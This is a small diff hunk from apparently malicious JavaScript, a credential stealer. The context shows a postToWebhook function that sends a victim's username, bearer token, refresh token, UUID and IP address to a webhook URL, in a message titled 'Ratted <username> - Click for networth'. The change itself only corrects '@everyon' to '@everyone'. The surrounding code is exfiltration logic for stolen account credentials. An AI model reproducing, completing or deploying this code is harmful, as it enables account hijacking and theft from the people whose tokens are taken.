@@ -125,7 +125,7 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
     const url = webhook_url
   
     let data = {
-  content: "@everyon",
+  content: "@everyone",
   embeds: [
     {
       title: "Ratted " + username + " - Click for networth",
